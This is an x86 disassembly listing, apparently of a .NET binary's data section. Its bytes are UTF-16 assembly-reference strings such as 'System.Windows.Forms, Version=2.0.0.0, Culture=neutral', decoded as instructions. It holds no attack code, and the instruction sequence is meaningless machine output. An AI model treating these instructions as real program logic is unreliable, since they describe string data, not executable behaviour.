  40bc80:	push   esp
  40bc81:	add    BYTE PTR [edi+0x0],ch
  40bc84:	imul   eax,DWORD PTR [eax],0x65
  40bc87:	add    BYTE PTR [esi+0x0],ch
  40bc8a:	cmp    eax,0x30006200
  40bc8f:	add    BYTE PTR [ebx],dh
  40bc91:	add    BYTE PTR [esi+0x0],ah
  40bc94:	xor    eax,0x37006600
  40bc99:	add    BYTE PTR [esi+0x0],ah
  40bc9c:	xor    DWORD PTR [eax],eax
  40bc9e:	xor    DWORD PTR [eax],eax
  40bca0:	add    BYTE PTR fs:0x61003000,dh
  40bca7:	add    BYTE PTR [ebx],dh
  40bca9:	add    BYTE PTR [ecx+0x0],ah
  40bcac:	cmp    BYTE PTR [eax+0x790053],0x73
  40bcb3:	add    BYTE PTR [eax+eax*1+0x65],dh
  40bcb7:	add    BYTE PTR [ebp+0x0],ch
  40bcba:	add    BYTE PTR cs:[ebp+0x0],al
  40bcbe:	outs   dx,BYTE PTR ds:[esi]
  40bcbf:	add    BYTE PTR [eax+eax*1+0x65],dh
  40bcc3:	add    BYTE PTR [edx+0x0],dh
  40bcc6:	jo     0x40bcc8
  40bcc8:	jb     0x40bcca
  40bcca:	imul   eax,DWORD PTR [eax],0x650073
  40bcd0:	push   ebx
  40bcd1:	add    BYTE PTR [ebp+0x0],ah
  40bcd4:	jb     0x40bcd6
  40bcd6:	jbe    0x40bcd8
  40bcd8:	imul   eax,DWORD PTR [eax],0x650063
  40bcde:	jae    0x40bce0
  40bce0:	sub    al,0x0
  40bce2:	and    BYTE PTR [eax],al
  40bce4:	push   esi
  40bce5:	add    BYTE PTR [ebp+0x0],ah
  40bce8:	jb     0x40bcea
  40bcea:	jae    0x40bcec
  40bcec:	imul   eax,DWORD PTR [eax],0x6e006f
  40bcf2:	cmp    eax,0x2e003200
  40bcf7:	add    BYTE PTR [eax],dh
  40bcf9:	add    BYTE PTR [esi],ch
  40bcfb:	add    BYTE PTR [eax],dh
  40bcfd:	add    BYTE PTR [esi],ch
  40bcff:	add    BYTE PTR [eax],dh
  40bd01:	add    BYTE PTR [eax+eax*1],ch
  40bd04:	and    BYTE PTR [eax],al
  40bd06:	inc    ebx
  40bd07:	add    BYTE PTR [ebp+0x0],dh
  40bd0a:	ins    BYTE PTR es:[edi],dx
  40bd0b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bd0f:	add    BYTE PTR [edx+0x0],dh
  40bd12:	add    BYTE PTR gs:0x65006e00,bh
  40bd19:	add    BYTE PTR [ebp+0x0],dh
  40bd1c:	je     0x40bd1e
  40bd1e:	jb     0x40bd20
  40bd20:	popa   
  40bd21:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40bd25:	add    BYTE PTR [eax],ah
  40bd27:	add    BYTE PTR [eax+0x0],dl
  40bd2a:	jne    0x40bd2c
  40bd2c:	bound  eax,QWORD PTR [eax]
  40bd2e:	ins    BYTE PTR es:[edi],dx
  40bd2f:	add    BYTE PTR [ecx+0x0],ch
  40bd32:	arpl   WORD PTR [eax],ax
  40bd34:	dec    ebx
  40bd35:	add    BYTE PTR [ebp+0x0],ah
  40bd38:	jns    0x40bd3a
  40bd3a:	push   esp
  40bd3b:	add    BYTE PTR [edi+0x0],ch
  40bd3e:	imul   eax,DWORD PTR [eax],0x65
  40bd41:	add    BYTE PTR [esi+0x0],ch
  40bd44:	cmp    eax,0x30006200
  40bd49:	add    BYTE PTR [ebx],dh
  40bd4b:	add    BYTE PTR [esi+0x0],ah
  40bd4e:	xor    eax,0x37006600
  40bd53:	add    BYTE PTR [esi+0x0],ah
  40bd56:	xor    DWORD PTR [eax],eax
  40bd58:	xor    DWORD PTR [eax],eax
  40bd5a:	add    BYTE PTR fs:0x61003000,dh
  40bd61:	add    BYTE PTR [ebx],dh
  40bd63:	add    BYTE PTR [ecx+0x0],ah
  40bd66:	sub    BYTE PTR [eax+0x790053],0x73
  40bd6d:	add    BYTE PTR [eax+eax*1+0x65],dh
  40bd71:	add    BYTE PTR [ebp+0x0],ch
  40bd74:	add    BYTE PTR cs:[ebp+0x0],cl
  40bd78:	popa   
  40bd79:	add    BYTE PTR [esi+0x0],ch
  40bd7c:	popa   
  40bd7d:	add    BYTE PTR [edi+0x0],ah
  40bd80:	add    BYTE PTR gs:[ebp+0x0],ch
  40bd84:	add    BYTE PTR gs:[esi+0x0],ch
  40bd88:	je     0x40bd8a
  40bd8a:	sub    al,0x0
  40bd8c:	and    BYTE PTR [eax],al
  40bd8e:	push   esi
  40bd8f:	add    BYTE PTR [ebp+0x0],ah
  40bd92:	jb     0x40bd94
  40bd94:	jae    0x40bd96
  40bd96:	imul   eax,DWORD PTR [eax],0x6e006f
  40bd9c:	cmp    eax,0x2e003200
  40bda1:	add    BYTE PTR [eax],dh
  40bda3:	add    BYTE PTR [esi],ch
  40bda5:	add    BYTE PTR [eax],dh
  40bda7:	add    BYTE PTR [esi],ch
  40bda9:	add    BYTE PTR [eax],dh
  40bdab:	add    BYTE PTR [eax+eax*1],ch
  40bdae:	and    BYTE PTR [eax],al
  40bdb0:	inc    ebx
  40bdb1:	add    BYTE PTR [ebp+0x0],dh
  40bdb4:	ins    BYTE PTR es:[edi],dx
  40bdb5:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bdb9:	add    BYTE PTR [edx+0x0],dh
  40bdbc:	add    BYTE PTR gs:0x65006e00,bh
  40bdc3:	add    BYTE PTR [ebp+0x0],dh
  40bdc6:	je     0x40bdc8
  40bdc8:	jb     0x40bdca
  40bdca:	popa   
  40bdcb:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40bdcf:	add    BYTE PTR [eax],ah
  40bdd1:	add    BYTE PTR [eax+0x0],dl
  40bdd4:	jne    0x40bdd6
  40bdd6:	bound  eax,QWORD PTR [eax]
  40bdd8:	ins    BYTE PTR es:[edi],dx
  40bdd9:	add    BYTE PTR [ecx+0x0],ch
  40bddc:	arpl   WORD PTR [eax],ax
  40bdde:	dec    ebx
  40bddf:	add    BYTE PTR [ebp+0x0],ah
  40bde2:	jns    0x40bde4
  40bde4:	push   esp
  40bde5:	add    BYTE PTR [edi+0x0],ch
  40bde8:	imul   eax,DWORD PTR [eax],0x65
  40bdeb:	add    BYTE PTR [esi+0x0],ch
  40bdee:	cmp    eax,0x30006200
  40bdf3:	add    BYTE PTR [ebx],dh
  40bdf5:	add    BYTE PTR [esi+0x0],ah
  40bdf8:	xor    eax,0x37006600
  40bdfd:	add    BYTE PTR [esi+0x0],ah
  40be00:	xor    DWORD PTR [eax],eax
  40be02:	xor    DWORD PTR [eax],eax
  40be04:	add    BYTE PTR fs:0x61003000,dh
  40be0b:	add    BYTE PTR [ebx],dh
  40be0d:	add    BYTE PTR [ecx+0x0],ah
  40be10:	and    BYTE PTR [esi+0x790053],0x73
  40be17:	add    BYTE PTR [eax+eax*1+0x65],dh
  40be1b:	add    BYTE PTR [ebp+0x0],ch
  40be1e:	add    BYTE PTR cs:[ebp+0x0],cl
  40be22:	add    BYTE PTR gs:[ebx+0x0],dh
  40be26:	jae    0x40be28
  40be28:	popa   
  40be29:	add    BYTE PTR [edi+0x0],ah
  40be2c:	imul   eax,DWORD PTR [eax],0x67006e
  40be32:	sub    al,0x0
  40be34:	and    BYTE PTR [eax],al
  40be36:	push   esi
  40be37:	add    BYTE PTR [ebp+0x0],ah
  40be3a:	jb     0x40be3c
  40be3c:	jae    0x40be3e
  40be3e:	imul   eax,DWORD PTR [eax],0x6e006f
  40be44:	cmp    eax,0x2e003200
  40be49:	add    BYTE PTR [eax],dh
  40be4b:	add    BYTE PTR [esi],ch
  40be4d:	add    BYTE PTR [eax],dh
  40be4f:	add    BYTE PTR [esi],ch
  40be51:	add    BYTE PTR [eax],dh
  40be53:	add    BYTE PTR [eax+eax*1],ch
  40be56:	and    BYTE PTR [eax],al
  40be58:	inc    ebx
  40be59:	add    BYTE PTR [ebp+0x0],dh
  40be5c:	ins    BYTE PTR es:[edi],dx
  40be5d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40be61:	add    BYTE PTR [edx+0x0],dh
  40be64:	add    BYTE PTR gs:0x65006e00,bh
  40be6b:	add    BYTE PTR [ebp+0x0],dh
  40be6e:	je     0x40be70
  40be70:	jb     0x40be72
  40be72:	popa   
  40be73:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40be77:	add    BYTE PTR [eax],ah
  40be79:	add    BYTE PTR [eax+0x0],dl
  40be7c:	jne    0x40be7e
  40be7e:	bound  eax,QWORD PTR [eax]
  40be80:	ins    BYTE PTR es:[edi],dx
  40be81:	add    BYTE PTR [ecx+0x0],ch
  40be84:	arpl   WORD PTR [eax],ax
  40be86:	dec    ebx
  40be87:	add    BYTE PTR [ebp+0x0],ah
  40be8a:	jns    0x40be8c
  40be8c:	push   esp
  40be8d:	add    BYTE PTR [edi+0x0],ch
  40be90:	imul   eax,DWORD PTR [eax],0x65
  40be93:	add    BYTE PTR [esi+0x0],ch
  40be96:	cmp    eax,0x30006200
  40be9b:	add    BYTE PTR [ebx],dh
  40be9d:	add    BYTE PTR [esi+0x0],ah
  40bea0:	xor    eax,0x37006600
  40bea5:	add    BYTE PTR [esi+0x0],ah
  40bea8:	xor    DWORD PTR [eax],eax
  40beaa:	xor    DWORD PTR [eax],eax
  40beac:	add    BYTE PTR fs:0x61003000,dh
  40beb3:	add    BYTE PTR [ebx],dh
  40beb5:	add    BYTE PTR [ecx+0x0],ah
  40beb8:	sbb    dh,0x53
  40bebb:	add    BYTE PTR [ecx+0x0],bh
  40bebe:	jae    0x40bec0
  40bec0:	je     0x40bec2
  40bec2:	add    BYTE PTR gs:[ebp+0x0],ch
  40bec6:	add    BYTE PTR cs:[edx+0x0],dl
  40beca:	jne    0x40becc
  40becc:	outs   dx,BYTE PTR ds:[esi]
  40becd:	add    BYTE PTR [eax+eax*1+0x69],dh
  40bed1:	add    BYTE PTR [ebp+0x0],ch
  40bed4:	add    BYTE PTR gs:[esi],ch
  40bed7:	add    BYTE PTR [ebx+0x0],dl
  40beda:	add    BYTE PTR gs:[edx+0x0],dh
  40bede:	imul   eax,DWORD PTR [eax],0x6c0061
  40bee4:	imul   eax,DWORD PTR [eax],0x61007a
  40beea:	je     0x40beec
  40beec:	imul   eax,DWORD PTR [eax],0x6e006f
  40bef2:	add    BYTE PTR cs:[esi+0x0],al
  40bef6:	outs   dx,DWORD PTR ds:[esi]
  40bef7:	add    BYTE PTR [edx+0x0],dh
  40befa:	ins    DWORD PTR es:[edi],dx
  40befb:	add    BYTE PTR [ecx+0x0],ah
  40befe:	je     0x40bf00
  40bf00:	je     0x40bf02
  40bf02:	add    BYTE PTR gs:[edx+0x0],dh
  40bf06:	jae    0x40bf08
  40bf08:	add    BYTE PTR cs:[ebx+0x0],dl
  40bf0c:	outs   dx,DWORD PTR ds:[esi]
  40bf0d:	add    BYTE PTR [ecx+0x0],ah
  40bf10:	jo     0x40bf12
  40bf12:	sub    al,0x0
  40bf14:	and    BYTE PTR [eax],al
  40bf16:	push   esi
  40bf17:	add    BYTE PTR [ebp+0x0],ah
  40bf1a:	jb     0x40bf1c
  40bf1c:	jae    0x40bf1e
  40bf1e:	imul   eax,DWORD PTR [eax],0x6e006f
  40bf24:	cmp    eax,0x2e003200
  40bf29:	add    BYTE PTR [eax],dh
  40bf2b:	add    BYTE PTR [esi],ch
  40bf2d:	add    BYTE PTR [eax],dh
  40bf2f:	add    BYTE PTR [esi],ch
  40bf31:	add    BYTE PTR [eax],dh
  40bf33:	add    BYTE PTR [eax+eax*1],ch
  40bf36:	and    BYTE PTR [eax],al
  40bf38:	inc    ebx
  40bf39:	add    BYTE PTR [ebp+0x0],dh
  40bf3c:	ins    BYTE PTR es:[edi],dx
  40bf3d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bf41:	add    BYTE PTR [edx+0x0],dh
  40bf44:	add    BYTE PTR gs:0x65006e00,bh
  40bf4b:	add    BYTE PTR [ebp+0x0],dh
  40bf4e:	je     0x40bf50
  40bf50:	jb     0x40bf52
  40bf52:	popa   
  40bf53:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40bf57:	add    BYTE PTR [eax],ah
  40bf59:	add    BYTE PTR [eax+0x0],dl
  40bf5c:	jne    0x40bf5e
  40bf5e:	bound  eax,QWORD PTR [eax]
  40bf60:	ins    BYTE PTR es:[edi],dx
  40bf61:	add    BYTE PTR [ecx+0x0],ch
  40bf64:	arpl   WORD PTR [eax],ax
  40bf66:	dec    ebx
  40bf67:	add    BYTE PTR [ebp+0x0],ah
  40bf6a:	jns    0x40bf6c
  40bf6c:	push   esp
  40bf6d:	add    BYTE PTR [edi+0x0],ch
  40bf70:	imul   eax,DWORD PTR [eax],0x65
  40bf73:	add    BYTE PTR [esi+0x0],ch
  40bf76:	cmp    eax,0x30006200
  40bf7b:	add    BYTE PTR [ebx],dh
  40bf7d:	add    BYTE PTR [esi+0x0],ah
  40bf80:	xor    eax,0x37006600
  40bf85:	add    BYTE PTR [esi+0x0],ah
  40bf88:	xor    DWORD PTR [eax],eax
  40bf8a:	xor    DWORD PTR [eax],eax
  40bf8c:	add    BYTE PTR fs:0x61003000,dh
  40bf93:	add    BYTE PTR [ebx],dh
  40bf95:	add    BYTE PTR [ecx+0x0],ah
  40bf98:	and    BYTE PTR [ebx+edx*2+0x73007900],0x0
  40bfa0:	je     0x40bfa2
  40bfa2:	add    BYTE PTR gs:[ebp+0x0],ch
  40bfa6:	add    BYTE PTR cs:[ebx+0x0],dl
  40bfaa:	add    BYTE PTR gs:[ebx+0x0],ah
  40bfae:	jne    0x40bfb0
  40bfb0:	jb     0x40bfb2
  40bfb2:	imul   eax,DWORD PTR [eax],0x790074
  40bfb8:	sub    al,0x0
  40bfba:	and    BYTE PTR [eax],al
  40bfbc:	push   esi
  40bfbd:	add    BYTE PTR [ebp+0x0],ah
  40bfc0:	jb     0x40bfc2
  40bfc2:	jae    0x40bfc4
  40bfc4:	imul   eax,DWORD PTR [eax],0x6e006f
  40bfca:	cmp    eax,0x2e003200
  40bfcf:	add    BYTE PTR [eax],dh
  40bfd1:	add    BYTE PTR [esi],ch
  40bfd3:	add    BYTE PTR [eax],dh
  40bfd5:	add    BYTE PTR [esi],ch
  40bfd7:	add    BYTE PTR [eax],dh
  40bfd9:	add    BYTE PTR [eax+eax*1],ch
  40bfdc:	and    BYTE PTR [eax],al
  40bfde:	inc    ebx
  40bfdf:	add    BYTE PTR [ebp+0x0],dh
  40bfe2:	ins    BYTE PTR es:[edi],dx
  40bfe3:	add    BYTE PTR [eax+eax*1+0x75],dh
  40bfe7:	add    BYTE PTR [edx+0x0],dh
  40bfea:	add    BYTE PTR gs:0x65006e00,bh
  40bff1:	add    BYTE PTR [ebp+0x0],dh
  40bff4:	je     0x40bff6
  40bff6:	jb     0x40bff8
  40bff8:	popa   
  40bff9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40bffd:	add    BYTE PTR [eax],ah
  40bfff:	add    BYTE PTR [eax+0x0],dl
  40c002:	jne    0x40c004
  40c004:	bound  eax,QWORD PTR [eax]
  40c006:	ins    BYTE PTR es:[edi],dx
  40c007:	add    BYTE PTR [ecx+0x0],ch
  40c00a:	arpl   WORD PTR [eax],ax
  40c00c:	dec    ebx
  40c00d:	add    BYTE PTR [ebp+0x0],ah
  40c010:	jns    0x40c012
  40c012:	push   esp
  40c013:	add    BYTE PTR [edi+0x0],ch
  40c016:	imul   eax,DWORD PTR [eax],0x65
  40c019:	add    BYTE PTR [esi+0x0],ch
  40c01c:	cmp    eax,0x30006200
  40c021:	add    BYTE PTR [ebx],dh
  40c023:	add    BYTE PTR [esi+0x0],ah
  40c026:	xor    eax,0x37006600
  40c02b:	add    BYTE PTR [esi+0x0],ah
  40c02e:	xor    DWORD PTR [eax],eax
  40c030:	xor    DWORD PTR [eax],eax
  40c032:	add    BYTE PTR fs:0x61003000,dh
  40c039:	add    BYTE PTR [ebx],dh
  40c03b:	add    BYTE PTR [ecx+0x0],ah
  40c03e:	xor    BYTE PTR [eax+0x790053],0x73
  40c045:	add    BYTE PTR [eax+eax*1+0x65],dh
  40c049:	add    BYTE PTR [ebp+0x0],ch
  40c04c:	add    BYTE PTR cs:[ebx+0x0],dl
  40c050:	add    BYTE PTR gs:[edx+0x0],dh
  40c054:	jbe    0x40c056
  40c056:	imul   eax,DWORD PTR [eax],0x650063
  40c05c:	push   eax
  40c05d:	add    BYTE PTR [edx+0x0],dh
  40c060:	outs   dx,DWORD PTR ds:[esi]
  40c061:	add    BYTE PTR [ebx+0x0],ah
  40c064:	add    BYTE PTR gs:[ebx+0x0],dh
  40c068:	jae    0x40c06a
  40c06a:	sub    al,0x0
  40c06c:	and    BYTE PTR [eax],al
  40c06e:	push   esi
  40c06f:	add    BYTE PTR [ebp+0x0],ah
  40c072:	jb     0x40c074
  40c074:	jae    0x40c076
  40c076:	imul   eax,DWORD PTR [eax],0x6e006f
  40c07c:	cmp    eax,0x2e003200
  40c081:	add    BYTE PTR [eax],dh
  40c083:	add    BYTE PTR [esi],ch
  40c085:	add    BYTE PTR [eax],dh
  40c087:	add    BYTE PTR [esi],ch
  40c089:	add    BYTE PTR [eax],dh
  40c08b:	add    BYTE PTR [eax+eax*1],ch
  40c08e:	and    BYTE PTR [eax],al
  40c090:	inc    ebx
  40c091:	add    BYTE PTR [ebp+0x0],dh
  40c094:	ins    BYTE PTR es:[edi],dx
  40c095:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c099:	add    BYTE PTR [edx+0x0],dh
  40c09c:	add    BYTE PTR gs:0x65006e00,bh
  40c0a3:	add    BYTE PTR [ebp+0x0],dh
  40c0a6:	je     0x40c0a8
  40c0a8:	jb     0x40c0aa
  40c0aa:	popa   
  40c0ab:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c0af:	add    BYTE PTR [eax],ah
  40c0b1:	add    BYTE PTR [eax+0x0],dl
  40c0b4:	jne    0x40c0b6
  40c0b6:	bound  eax,QWORD PTR [eax]
  40c0b8:	ins    BYTE PTR es:[edi],dx
  40c0b9:	add    BYTE PTR [ecx+0x0],ch
  40c0bc:	arpl   WORD PTR [eax],ax
  40c0be:	dec    ebx
  40c0bf:	add    BYTE PTR [ebp+0x0],ah
  40c0c2:	jns    0x40c0c4
  40c0c4:	push   esp
  40c0c5:	add    BYTE PTR [edi+0x0],ch
  40c0c8:	imul   eax,DWORD PTR [eax],0x65
  40c0cb:	add    BYTE PTR [esi+0x0],ch
  40c0ce:	cmp    eax,0x30006200
  40c0d3:	add    BYTE PTR [ebx],dh
  40c0d5:	add    BYTE PTR [esi+0x0],ah
  40c0d8:	xor    eax,0x37006600
  40c0dd:	add    BYTE PTR [esi+0x0],ah
  40c0e0:	xor    DWORD PTR [eax],eax
  40c0e2:	xor    DWORD PTR [eax],eax
  40c0e4:	add    BYTE PTR fs:0x61003000,dh
  40c0eb:	add    BYTE PTR [ebx],dh
  40c0ed:	add    BYTE PTR [ecx+0x0],ah
  40c0f0:	sbb    BYTE PTR [edx+0x790053],0x73
  40c0f7:	add    BYTE PTR [eax+eax*1+0x65],dh
  40c0fb:	add    BYTE PTR [ebp+0x0],ch
  40c0fe:	add    BYTE PTR cs:[edi+0x0],dl
  40c102:	add    BYTE PTR gs:[edx+0x0],ah
  40c106:	sub    al,0x0
  40c108:	and    BYTE PTR [eax],al
  40c10a:	push   esi
  40c10b:	add    BYTE PTR [ebp+0x0],ah
  40c10e:	jb     0x40c110
  40c110:	jae    0x40c112
  40c112:	imul   eax,DWORD PTR [eax],0x6e006f
  40c118:	cmp    eax,0x2e003200
  40c11d:	add    BYTE PTR [eax],dh
  40c11f:	add    BYTE PTR [esi],ch
  40c121:	add    BYTE PTR [eax],dh
  40c123:	add    BYTE PTR [esi],ch
  40c125:	add    BYTE PTR [eax],dh
  40c127:	add    BYTE PTR [eax+eax*1],ch
  40c12a:	and    BYTE PTR [eax],al
  40c12c:	inc    ebx
  40c12d:	add    BYTE PTR [ebp+0x0],dh
  40c130:	ins    BYTE PTR es:[edi],dx
  40c131:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c135:	add    BYTE PTR [edx+0x0],dh
  40c138:	add    BYTE PTR gs:0x65006e00,bh
  40c13f:	add    BYTE PTR [ebp+0x0],dh
  40c142:	je     0x40c144
  40c144:	jb     0x40c146
  40c146:	popa   
  40c147:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c14b:	add    BYTE PTR [eax],ah
  40c14d:	add    BYTE PTR [eax+0x0],dl
  40c150:	jne    0x40c152
  40c152:	bound  eax,QWORD PTR [eax]
  40c154:	ins    BYTE PTR es:[edi],dx
  40c155:	add    BYTE PTR [ecx+0x0],ch
  40c158:	arpl   WORD PTR [eax],ax
  40c15a:	dec    ebx
  40c15b:	add    BYTE PTR [ebp+0x0],ah
  40c15e:	jns    0x40c160
  40c160:	push   esp
  40c161:	add    BYTE PTR [edi+0x0],ch
  40c164:	imul   eax,DWORD PTR [eax],0x65
  40c167:	add    BYTE PTR [esi+0x0],ch
  40c16a:	cmp    eax,0x30006200
  40c16f:	add    BYTE PTR [ebx],dh
  40c171:	add    BYTE PTR [esi+0x0],ah
  40c174:	xor    eax,0x37006600
  40c179:	add    BYTE PTR [esi+0x0],ah
  40c17c:	xor    DWORD PTR [eax],eax
  40c17e:	xor    DWORD PTR [eax],eax
  40c180:	add    BYTE PTR fs:0x61003000,dh
  40c187:	add    BYTE PTR [ebx],dh
  40c189:	add    BYTE PTR [ecx+0x0],ah
  40c18c:	xor    BYTE PTR [ebx+edx*2+0x73007900],0x0
  40c194:	je     0x40c196
  40c196:	add    BYTE PTR gs:[ebp+0x0],ch
  40c19a:	add    BYTE PTR cs:[edi+0x0],dl
  40c19e:	add    BYTE PTR gs:[edx+0x0],ah
  40c1a2:	add    BYTE PTR cs:[ecx+0x0],al
  40c1a6:	bound  eax,QWORD PTR [eax]
  40c1a8:	jae    0x40c1aa
  40c1aa:	je     0x40c1ac
  40c1ac:	jb     0x40c1ae
  40c1ae:	popa   
  40c1af:	add    BYTE PTR [ebx+0x0],ah
  40c1b2:	je     0x40c1b4
  40c1b4:	imul   eax,DWORD PTR [eax],0x6e006f
  40c1ba:	jae    0x40c1bc
  40c1bc:	sub    al,0x0
  40c1be:	and    BYTE PTR [eax],al
  40c1c0:	push   esi
  40c1c1:	add    BYTE PTR [ebp+0x0],ah
  40c1c4:	jb     0x40c1c6
  40c1c6:	jae    0x40c1c8
  40c1c8:	imul   eax,DWORD PTR [eax],0x6e006f
  40c1ce:	cmp    eax,0x2e003300
  40c1d3:	add    BYTE PTR ds:0x30002e00,dh
  40c1d9:	add    BYTE PTR [esi],ch
  40c1db:	add    BYTE PTR [eax],dh
  40c1dd:	add    BYTE PTR [eax+eax*1],ch
  40c1e0:	and    BYTE PTR [eax],al
  40c1e2:	inc    ebx
  40c1e3:	add    BYTE PTR [ebp+0x0],dh
  40c1e6:	ins    BYTE PTR es:[edi],dx
  40c1e7:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c1eb:	add    BYTE PTR [edx+0x0],dh
  40c1ee:	add    BYTE PTR gs:0x65006e00,bh
  40c1f5:	add    BYTE PTR [ebp+0x0],dh
  40c1f8:	je     0x40c1fa
  40c1fa:	jb     0x40c1fc
  40c1fc:	popa   
  40c1fd:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c201:	add    BYTE PTR [eax],ah
  40c203:	add    BYTE PTR [eax+0x0],dl
  40c206:	jne    0x40c208
  40c208:	bound  eax,QWORD PTR [eax]
  40c20a:	ins    BYTE PTR es:[edi],dx
  40c20b:	add    BYTE PTR [ecx+0x0],ch
  40c20e:	arpl   WORD PTR [eax],ax
  40c210:	dec    ebx
  40c211:	add    BYTE PTR [ebp+0x0],ah
  40c214:	jns    0x40c216
  40c216:	push   esp
  40c217:	add    BYTE PTR [edi+0x0],ch
  40c21a:	imul   eax,DWORD PTR [eax],0x65
  40c21d:	add    BYTE PTR [esi+0x0],ch
  40c220:	cmp    eax,0x31003300
  40c225:	add    BYTE PTR [edx+0x0],ah
  40c228:	data16 add BYTE PTR [ebx],dh
  40c22b:	add    BYTE PTR [eax],bh
  40c22d:	add    BYTE PTR ds:0x61003600,dh
  40c233:	add    BYTE PTR [eax+eax*1+0x33],ah
  40c237:	add    BYTE PTR [esi],dh
  40c239:	add    BYTE PTR [eax+eax*1],dh
  40c23c:	add    BYTE PTR gs:[ebx],dh
  40c23f:	add    BYTE PTR ds:0x53b28000,dh
  40c245:	add    BYTE PTR [ecx+0x0],bh
  40c248:	jae    0x40c24a
  40c24a:	je     0x40c24c
  40c24c:	add    BYTE PTR gs:[ebp+0x0],ch
  40c250:	add    BYTE PTR cs:[edi+0x0],dl
  40c254:	add    BYTE PTR gs:[edx+0x0],ah
  40c258:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  40c25d:	add    BYTE PTR [esi+0x0],ch
  40c260:	popa   
  40c261:	add    BYTE PTR [ebp+0x0],ch
  40c264:	imul   eax,DWORD PTR [eax],0x440063
  40c26a:	popa   
  40c26b:	add    BYTE PTR [eax+eax*1+0x61],dh
  40c26f:	add    BYTE PTR [eax+eax*1],ch
  40c272:	and    BYTE PTR [eax],al
  40c274:	push   esi
  40c275:	add    BYTE PTR [ebp+0x0],ah
  40c278:	jb     0x40c27a
  40c27a:	jae    0x40c27c
  40c27c:	imul   eax,DWORD PTR [eax],0x6e006f
  40c282:	cmp    eax,0x2e003300
  40c287:	add    BYTE PTR ds:0x30002e00,dh
  40c28d:	add    BYTE PTR [esi],ch
  40c28f:	add    BYTE PTR [eax],dh
  40c291:	add    BYTE PTR [eax+eax*1],ch
  40c294:	and    BYTE PTR [eax],al
  40c296:	inc    ebx
  40c297:	add    BYTE PTR [ebp+0x0],dh
  40c29a:	ins    BYTE PTR es:[edi],dx
  40c29b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c29f:	add    BYTE PTR [edx+0x0],dh
  40c2a2:	add    BYTE PTR gs:0x65006e00,bh
  40c2a9:	add    BYTE PTR [ebp+0x0],dh
  40c2ac:	je     0x40c2ae
  40c2ae:	jb     0x40c2b0
  40c2b0:	popa   
  40c2b1:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c2b5:	add    BYTE PTR [eax],ah
  40c2b7:	add    BYTE PTR [eax+0x0],dl
  40c2ba:	jne    0x40c2bc
  40c2bc:	bound  eax,QWORD PTR [eax]
  40c2be:	ins    BYTE PTR es:[edi],dx
  40c2bf:	add    BYTE PTR [ecx+0x0],ch
  40c2c2:	arpl   WORD PTR [eax],ax
  40c2c4:	dec    ebx
  40c2c5:	add    BYTE PTR [ebp+0x0],ah
  40c2c8:	jns    0x40c2ca
  40c2ca:	push   esp
  40c2cb:	add    BYTE PTR [edi+0x0],ch
  40c2ce:	imul   eax,DWORD PTR [eax],0x65
  40c2d1:	add    BYTE PTR [esi+0x0],ch
  40c2d4:	cmp    eax,0x31003300
  40c2d9:	add    BYTE PTR [edx+0x0],ah
  40c2dc:	data16 add BYTE PTR [ebx],dh
  40c2df:	add    BYTE PTR [eax],bh
  40c2e1:	add    BYTE PTR ds:0x61003600,dh
  40c2e7:	add    BYTE PTR [eax+eax*1+0x33],ah
  40c2eb:	add    BYTE PTR [esi],dh
  40c2ed:	add    BYTE PTR [eax+eax*1],dh
  40c2f0:	add    BYTE PTR gs:[ebx],dh
  40c2f3:	add    BYTE PTR ds:0x53c08000,dh
  40c2f9:	add    BYTE PTR [ecx+0x0],bh
  40c2fc:	jae    0x40c2fe
  40c2fe:	je     0x40c300
  40c300:	add    BYTE PTR gs:[ebp+0x0],ch
  40c304:	add    BYTE PTR cs:[edi+0x0],dl
  40c308:	add    BYTE PTR gs:[edx+0x0],ah
  40c30c:	add    BYTE PTR cs:[eax+eax*1+0x79],al
  40c311:	add    BYTE PTR [esi+0x0],ch
  40c314:	popa   
  40c315:	add    BYTE PTR [ebp+0x0],ch
  40c318:	imul   eax,DWORD PTR [eax],0x440063
  40c31e:	popa   
  40c31f:	add    BYTE PTR [eax+eax*1+0x61],dh
  40c323:	add    BYTE PTR [esi],ch
  40c325:	add    BYTE PTR [eax+eax*1+0x65],al
  40c329:	add    BYTE PTR [ebx+0x0],dh
  40c32c:	imul   eax,DWORD PTR [eax],0x6e0067
  40c332:	sub    al,0x0
  40c334:	and    BYTE PTR [eax],al
  40c336:	push   esi
  40c337:	add    BYTE PTR [ebp+0x0],ah
  40c33a:	jb     0x40c33c
  40c33c:	jae    0x40c33e
  40c33e:	imul   eax,DWORD PTR [eax],0x6e006f
  40c344:	cmp    eax,0x2e003300
  40c349:	add    BYTE PTR ds:0x30002e00,dh
  40c34f:	add    BYTE PTR [esi],ch
  40c351:	add    BYTE PTR [eax],dh
  40c353:	add    BYTE PTR [eax+eax*1],ch
  40c356:	and    BYTE PTR [eax],al
  40c358:	inc    ebx
  40c359:	add    BYTE PTR [ebp+0x0],dh
  40c35c:	ins    BYTE PTR es:[edi],dx
  40c35d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c361:	add    BYTE PTR [edx+0x0],dh
  40c364:	add    BYTE PTR gs:0x65006e00,bh
  40c36b:	add    BYTE PTR [ebp+0x0],dh
  40c36e:	je     0x40c370
  40c370:	jb     0x40c372
  40c372:	popa   
  40c373:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c377:	add    BYTE PTR [eax],ah
  40c379:	add    BYTE PTR [eax+0x0],dl
  40c37c:	jne    0x40c37e
  40c37e:	bound  eax,QWORD PTR [eax]
  40c380:	ins    BYTE PTR es:[edi],dx
  40c381:	add    BYTE PTR [ecx+0x0],ch
  40c384:	arpl   WORD PTR [eax],ax
  40c386:	dec    ebx
  40c387:	add    BYTE PTR [ebp+0x0],ah
